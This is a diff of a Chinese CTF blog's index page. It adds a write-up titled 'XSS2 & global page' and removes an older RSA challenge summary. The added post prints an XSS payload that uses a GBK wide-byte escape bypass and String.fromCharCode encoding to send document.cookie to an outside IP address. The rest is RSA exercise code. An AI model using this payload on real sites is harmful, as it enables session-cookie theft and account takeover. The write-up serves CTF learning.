@@ -232,6 +232,164 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/25/XSS2-global-page/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Conlonial">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Conlonial's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/09/25/XSS2-global-page/" itemprop="url">XSS2 & global page</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-25T17:15:54+08:00">
+                2019-09-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><center> XSS2 &amp; global page </center></p>
+<p><center>——XSS2——</center></p>
+<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><ul>
+<li>GBK 宽字节绕过<blockquote>
+<p><a href="http://xuelinf.github.io/2016/05/10/-level4%E7%A6%BB%E5%A5%87%E7%9A%84%E5%AE%BD%E5%AD%97%E8%8A%82-XSS%E5%8D%87%E7%BA%A7%E4%B9%8B%E8%B7%AF/" target="_blank" rel="noopener">http://xuelinf.github.io/2016/05/10/-level4%E7%A6%BB%E5%A5%87%E7%9A%84%E5%AE%BD%E5%AD%97%E8%8A%82-XSS%E5%8D%87%E7%BA%A7%E4%B9%8B%E8%B7%AF/</a><br><a href="https://lyiang.wordpress.com/2015/06/09/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88gbk%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%EF%BC%89/" target="_blank" rel="noopener">https://lyiang.wordpress.com/2015/06/09/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88gbk%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%EF%BC%89/</a></p>
+</blockquote>
+</li>
+<li>绕过实例(0x02)<blockquote>
+<p><a href="https://www.angelwhu.com/blog/?p=490" target="_blank" rel="noopener">https://www.angelwhu.com/blog/?p=490</a></p>
+</blockquote>
+</li>
+<li>转码工具：<blockquote>
+<p><a href="https://www.toolmao.com/xsstranser" target="_blank" rel="noopener">https://www.toolmao.com/xsstranser</a></p>
+</blockquote>
+</li>
+</ul>
+<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>XSS2绕过和XSS1绕过是一样的，都是对前后双引号进行绕过，但是XSS2过滤方法是把每个输入字符前加一个<code>\</code>反斜杠，所以利用宽字节绕过将XSS1的payload进行修改即可。<br>首先在双引号的转义%22前加上%c0把前面的双引号闭合，剩余部分只能使用编码来解决。使用<code>string.fromcharcode()</code>对后面部分编码来绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">编码前payload:%c0%22;decument.write(&quot;&lt;script&gt;document.location=&apos;http://118.190.246.63/get-cookie.php?x=&apos;+document.cookie;&lt;/script&gt;&quot;);//</span><br><span class="line">编码后： %c0%22;document.write(String.fromCharCode(34,60,105,109,103,32,115,114,99,61,104,116,116,112,58,47,47,49,49,56,46,49,57,48,46,50,52,54,46,54,51,47,103,101,116,45,99,111,111,107,105,101,46,112,104,112,63,120,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,43,34,32,47,62,34));//</span><br></pre></td></tr></table></figure>
+<p><font color="#D2691E">注意宽字节绕过在Wired filter ce’shi测试时要在地址栏直接输入，否则无法绕过</font><br>在xss界面输入相应payload和MD验证码，就可以在服务器获得flag</p>
+<hr>
+<p><center>—–EasyTrick——</center></p>
+<h3 id="参考：-1"><a href="#参考：-1" class="headerlink" title="参考："></a>参考：</h3><ul>
+<li>RSA （关注数学推导）<blockquote>
+<p><a href="http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html</a></p>
+</blockquote>
+</li>
+</ul>
+<p>步骤如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">找出两个互为素数的 p 和 q；</span><br><span class="line">计算 N = p * q；</span><br><span class="line">计算 φ(N) = φ(p * q) = (p-1) * (q-1)；</span><br><span class="line">找出一个 e，1 &lt; e &lt; φ(N)，且e与φ(N) 互质</span><br><span class="line">根据 e * d ≡ 1(mod φ(N))</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>扩展欧几里得：<blockquote>
+<p><a href="https://www.cnblogs.com/GjqDream/p/11537934.html" target="_blank" rel="noopener">https://www.cnblogs.com/GjqDream/p/11537934.html</a></p>
+</blockquote>
+</li>
+</ul>
+<h3 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h3><p>这道题我们先直接在虚拟机链接所给的nccat，可以知道，本题给出了N、e、p+q的值，那么思路就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">已知数据：p + q 、N(p * q)、e</span><br><span class="line">所求数据：d（私钥）</span><br><span class="line">e * d ≡ 1 (mod φ(n) )</span><br><span class="line">e * d – k * φ(n) = 1</span><br></pre></td></tr></table></figure>
+<p>代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def ex_gcd(a,b):</span><br><span class="line">	if b == 0:</span><br><span class="line">		return 1,0,a</span><br><span class="line">	else:</span><br><span class="line">		x,y,q = ex_gcd(b,a%b) </span><br><span class="line">		x,y = y,(x-(a//b)*y)</span><br><span class="line">		print (&quot;a%b = &quot;,a%b,&quot;x =&quot;,x,&quot;y =&quot;,y)</span><br><span class="line">		return x,y,q</span><br><span class="line">N = int(input(&quot;input N:&quot;))</span><br><span class="line">P_Q = int(input(&quot;input P+Q :&quot;))</span><br><span class="line">a = int(input(&quot;please input e: &quot;))</span><br><span class="line">b = N-P_Q+1</span><br><span class="line">x,y,q = ex_gcd(a,b)</span><br><span class="line">print(&quot;x:&quot;,x)</span><br><span class="line">print (&quot;y&quot;,y)</span><br><span class="line">print(&quot;e*d+k*fn = &quot;,a*x+b*y)</span><br></pre></td></tr></table></figure>
+<p>每次给的p+q都不同，所以算出来的d（就是程序中的x）也不一样<br>进行交互得到flag</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/04/XSS1-babyxss再回顾/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1434,145 +1592,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/20190422做题总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Conlonial">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Conlonial's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/22/20190422做题总结/" itemprop="url">20190422做题总结</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-22T15:51:34+08:00">
-                2019-04-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="20190422做题总结"><a href="#20190422做题总结" class="headerlink" title="20190422做题总结"></a>20190422做题总结</h1><h2 id="1-RSA2"><a href="#1-RSA2" class="headerlink" title="1. RSA2"></a>1. RSA2</h2><h3 id="首先对pubkey-pem进行信息提取"><a href="#首先对pubkey-pem进行信息提取" class="headerlink" title="首先对pubkey.pem进行信息提取"></a>首先对pubkey.pem进行信息提取</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in pubkey.pem</span><br></pre></td></tr></table></figure>
-<h3 id="得到n和e"><a href="#得到n和e" class="headerlink" title="得到n和e"></a>得到n和e<img src="https://i.imgur.com/eFJzzl3.png" alt="Imgur"></h3><h3 id="对n在http-factordb-com-进行在线分解，得p，q-Imgur-https-i-imgur-com-nog6NnU-png"><a href="#对n在http-factordb-com-进行在线分解，得p，q-Imgur-https-i-imgur-com-nog6NnU-png" class="headerlink" title="对n在http://factordb.com/进行在线分解，得p，q![Imgur](https://i.imgur.com/nog6NnU.png)"></a>对n在<a href="http://factordb.com/进行在线分解，得p，q![Imgur](https://i.imgur.com/nog6NnU.png)" target="_blank" rel="noopener">http://factordb.com/进行在线分解，得p，q![Imgur](https://i.imgur.com/nog6NnU.png)</a></h3><h3 id="此时已知p，q，e即可得到d为"><a href="#此时已知p，q，e即可得到d为" class="headerlink" title="此时已知p，q，e即可得到d为"></a>此时已知p，q，e即可得到d为</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># coding = utf-8</span><br><span class="line">def computeD(fn, e):</span><br><span class="line">    (x, y, r) = extendedGCD(fn, e)</span><br><span class="line">    #y maybe &lt; 0, so convert it</span><br><span class="line">    if y &lt; 0:</span><br><span class="line">        return fn + y</span><br><span class="line">    return y</span><br><span class="line"> </span><br><span class="line">def extendedGCD(a, b):</span><br><span class="line">    #a*xi + b*yi = ri</span><br><span class="line">    if b == 0:</span><br><span class="line">        return (1, 0, a)</span><br><span class="line">    #a*x1 + b*y1 = a</span><br><span class="line">    x1 = 1</span><br><span class="line">    y1 = 0</span><br><span class="line">    #a*x2 + b*y2 = b</span><br><span class="line">    x2 = 0</span><br><span class="line">    y2 = 1</span><br><span class="line">    while b != 0:</span><br><span class="line">        q = a / b</span><br><span class="line">        #ri = r(i-2) % r(i-1)</span><br><span class="line">        r = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = r</span><br><span class="line">        #xi = x(i-2) - q*x(i-1)</span><br><span class="line">        x = x1 - q*x2</span><br><span class="line">        x1 = x2</span><br><span class="line">        x2 = x</span><br><span class="line">        #yi = y(i-2) - q*y(i-1)</span><br><span class="line">        y = y1 - q*y2</span><br><span class="line">        y1 = y2</span><br><span class="line">        y2 = y</span><br><span class="line">    return(x1, y1, a)</span><br><span class="line"> </span><br><span class="line">p = 275127860351348928173285174381581152299</span><br><span class="line">q = 319576316814478949870590164193048041239</span><br><span class="line">e = 65537</span><br><span class="line"> </span><br><span class="line">n = p * q</span><br><span class="line">fn = (p - 1) * (q - 1)</span><br><span class="line"> </span><br><span class="line">d = computeD(fn, e)</span><br><span class="line">print d</span><br></pre></td></tr></table></figure>
-<h3 id="运行结果如下"><a href="#运行结果如下" class="headerlink" title="运行结果如下"></a>运行结果如下</h3><p><img src="https://i.imgur.com/kkQ8trw.png" alt="Imgur"></p>
-<h3 id="此时d已知，即可对flag-encrypt这一密文先进行读取："><a href="#此时d已知，即可对flag-encrypt这一密文先进行读取：" class="headerlink" title="此时d已知，即可对flag.encrypt这一密文先进行读取："></a>此时d已知，即可对flag.encrypt这一密文先进行读取：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;f = open(&apos;flag.encrypt&apos;)</span><br><span class="line">&gt;&gt;p = f.read()</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.imgur.com/qFGmU3B.png" alt="Imgur"></p>
-<h3 id="即可看到密文内容，接着对密文内容进行16进制编码："><a href="#即可看到密文内容，接着对密文内容进行16进制编码：" class="headerlink" title="即可看到密文内容，接着对密文内容进行16进制编码："></a>即可看到密文内容，接着对密文内容进行16进制编码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;p.encode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure>
-<h3 id="就得到它16进制的形式：8fbb3b0f58b88b53e79d85c1ed68c355ac57c75884bd1e8e21c7ae9c6c82ddbb"><a href="#就得到它16进制的形式：8fbb3b0f58b88b53e79d85c1ed68c355ac57c75884bd1e8e21c7ae9c6c82ddbb" class="headerlink" title="就得到它16进制的形式：8fbb3b0f58b88b53e79d85c1ed68c355ac57c75884bd1e8e21c7ae9c6c82ddbb"></a>就得到它16进制的形式：8fbb3b0f58b88b53e79d85c1ed68c355ac57c75884bd1e8e21c7ae9c6c82ddbb</h3><h3 id="在转换为字符串，即为c："><a href="#在转换为字符串，即为c：" class="headerlink" title="在转换为字符串，即为c："></a>在转换为字符串，即为c：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;c=0x8fbb3b0f58b88b53e79d85c1ed68c355ac57c75884bd1e8e21c7ae9c6c82ddbb</span><br><span class="line">&gt;&gt;print c</span><br></pre></td></tr></table></figure>
-<h3 id="现在利用公式pow（c，d，n）就可以得到明文十进制形式"><a href="#现在利用公式pow（c，d，n）就可以得到明文十进制形式" class="headerlink" title="现在利用公式pow（c，d，n）就可以得到明文十进制形式"></a>现在利用公式pow（c，d，n）就可以得到明文十进制形式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;d = 10866948760844599168252082612378495977388271279679231539839049698621994994673</span><br><span class="line"></span><br><span class="line">&gt;&gt;n = 87924348264132406875276140514499937145050893665602592992418171647042491658461</span><br><span class="line"></span><br><span class="line">&gt;&gt;pow(c.d.n)</span><br></pre></td></tr></table></figure>
-<h3 id="十进制形式无法进行编码，故要转换为16进制-利用hex："><a href="#十进制形式无法进行编码，故要转换为16进制-利用hex：" class="headerlink" title="十进制形式无法进行编码，故要转换为16进制,利用hex："></a>十进制形式无法进行编码，故要转换为16进制,利用hex：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;pp = 10786438895796771334553405582542071004794259807619608563847580041597</span><br><span class="line">&gt;&gt;hex(pp)</span><br></pre></td></tr></table></figure>
-<h3 id="最后解密可得flag："><a href="#最后解密可得flag：" class="headerlink" title="最后解密可得flag："></a>最后解密可得flag：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;s=&apos;666c61677b5930755f6d34795f754e6433727374616e645f5253417d&apos;</span><br><span class="line">&gt;&gt;s.decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.imgur.com/zQaStkg.png" alt="Imgur"></p>
-<hr>
-<h2 id="Wiener-Tricky"><a href="#Wiener-Tricky" class="headerlink" title="Wiener Tricky"></a>Wiener Tricky</h2><h3 id="首先同上对rsa-pub-pem进行信息提取，再对n进行分解，发现n太大无法分解。根据题目，可知要采取维纳攻击，在网上查找到相关的代码，https-github-com-pablocelayes-rsa-wiener-attack-后下载所有代码于桌面，运行程序可得解密密钥d"><a href="#首先同上对rsa-pub-pem进行信息提取，再对n进行分解，发现n太大无法分解。根据题目，可知要采取维纳攻击，在网上查找到相关的代码，https-github-com-pablocelayes-rsa-wiener-attack-后下载所有代码于桌面，运行程序可得解密密钥d" class="headerlink" title="首先同上对rsa_pub.pem进行信息提取，再对n进行分解，发现n太大无法分解。根据题目，可知要采取维纳攻击，在网上查找到相关的代码，https://github.com/pablocelayes/rsa-wiener-attack 后下载所有代码于桌面，运行程序可得解密密钥d:"></a>首先同上对rsa_pub.pem进行信息提取，再对n进行分解，发现n太大无法分解。根据题目，可知要采取维纳攻击，在网上查找到相关的代码，<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">https://github.com/pablocelayes/rsa-wiener-attack</a> 后下载所有代码于桌面，运行程序可得解密密钥d:</h3><p> <img src="https://i.imgur.com/S2BNdxu.png" alt="Imgur"></p>
-<h3 id="接下来步骤同上题，提取flag-enc文件内容"><a href="#接下来步骤同上题，提取flag-enc文件内容" class="headerlink" title="接下来步骤同上题，提取flag.enc文件内容"></a>接下来步骤同上题，提取flag.enc文件内容</h3><p> <img src="https://i.imgur.com/AXjuGyr.png" alt="Imgur"></p>
-<h3 id="进行16进制编码，再转为10进制c"><a href="#进行16进制编码，再转为10进制c" class="headerlink" title="进行16进制编码，再转为10进制c:"></a>进行16进制编码，再转为10进制c:</h3><p> <img src="https://i.imgur.com/WyyviDM.png" alt="Imgur"></p>
-<h3 id="现已知c，d，n，即可求明文pp："><a href="#现已知c，d，n，即可求明文pp：" class="headerlink" title="现已知c，d，n，即可求明文pp："></a>现已知c，d，n，即可求明文pp：</h3><p> <img src="https://i.imgur.com/LmmMFEo.png" alt="Imgur"></p>
-<h3 id="将明文变为16进制后在解密即得flag"><a href="#将明文变为16进制后在解密即得flag" class="headerlink" title="将明文变为16进制后在解密即得flag"></a>将明文变为16进制后在解密即得flag</h3><p> <img src="https://i.imgur.com/sxMp9Us.png" alt="Imgur"><br> <img src="https://i.imgur.com/ljNw0Ta.png" alt="Imgur"></p>
-<blockquote>
-<h3 id="但这时发现报错TypeError-Odd-length-string"><a href="#但这时发现报错TypeError-Odd-length-string" class="headerlink" title="但这时发现报错TypeError: Odd-length string"></a>但这时发现报错TypeError: Odd-length string</h3></blockquote>
-<h3 id="经过搜索得知错误原因为字符串长度为奇数-一位16进制数转换为4位二进制数-所以奇数个16进制数无法刚好转换为整数个字节。而高位的0经常被省略，所以在高位补零后得到flag："><a href="#经过搜索得知错误原因为字符串长度为奇数-一位16进制数转换为4位二进制数-所以奇数个16进制数无法刚好转换为整数个字节。而高位的0经常被省略，所以在高位补零后得到flag：" class="headerlink" title="经过搜索得知错误原因为字符串长度为奇数, 一位16进制数转换为4位二进制数, 所以奇数个16进制数无法刚好转换为整数个字节。而高位的0经常被省略，所以在高位补零后得到flag："></a>经过搜索得知错误原因为字符串长度为奇数, 一位16进制数转换为4位二进制数, 所以奇数个16进制数无法刚好转换为整数个字节。而高位的0经常被省略，所以在高位补零后得到flag：</h3><p><img src="https://i.imgur.com/nAltjDV.png" alt="Imgur"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1623,7 +1642,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-count">20</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
